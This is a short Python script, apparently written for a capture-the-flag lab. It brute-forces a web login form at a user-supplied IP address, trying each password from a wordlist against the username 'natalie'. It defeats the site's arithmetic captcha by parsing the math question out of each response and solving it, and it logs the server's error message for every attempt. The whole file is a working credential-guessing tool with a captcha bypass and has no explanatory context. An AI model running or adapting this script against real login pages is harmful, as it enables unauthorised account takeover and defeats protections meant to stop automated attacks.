import requests
import re

ip_addr = input("Enter IP = ")

# URL
url = f'http://{ip_addr}/login'


captcha_answer=1

# Data  
with open ('passwords.txt','r') as file:
    read_name=file.read().splitlines()

    for names in read_name:
        Username="natalie"
        Password = names

        session=requests.session()
        
        data = {'username': Username , 'password': Password , 'captcha' : captcha_answer}
            
        response = session.post( url, data=data )
            
        #print(response.text)
            
        with open('response.txt','w') as file:
                
                file.write(response.text)
                
                search_word="Captcha enabled"
                captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'

                match=re.search(captcha_regex,response.text)
                if match:
                        num1 = int(match.group(1))
                        operator = match.group(2)
                        num2 = int(match.group(3))

                        if operator == '+':
                            captcha_answer = num1 + num2
                        elif operator == '-':
                            captcha_answer = num1 - num2
                        elif operator == '*':
                            captcha_answer = num1 * num2
                        else:
                            print("Nothing !!!")

        error_message_match = re.search(r'Error(.+)', response.text)
        
        if error_message_match:
            error_message = error_message_match.group(1)
        
        else:
            error_message = 'Error message not found'
        
        print(f"{Password} - Error message: {error_message} ")

        with open('password_output.txt' , 'a') as kr:
            kr.write(f'{Password} - Error message: {error_message}\n')